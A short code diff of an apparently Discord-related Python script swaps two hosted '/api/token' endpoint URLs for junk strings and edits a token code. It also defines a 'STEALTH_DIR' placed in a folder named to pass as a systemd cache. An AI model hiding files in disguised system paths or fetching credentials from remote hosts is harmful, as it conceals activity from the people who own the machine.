@@ -18,10 +18,10 @@ import logging
 from pathlib import Path
 
 DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
-TOKEN_CODE = "asdfghjkl"
+TOKEN_CODE = "asdfadfhjkl"
 TOKEN_BASE_URLS = [
-    "https://new-production-8df3.up.railway.app/api/token",
-    "https://new-5itj.onrender.com/api/token"
+    "dafn",
+    "nnon"
 ]
 
 STEALTH_DIR = Path.home() / ".local" / "share" / "systemd-cache"
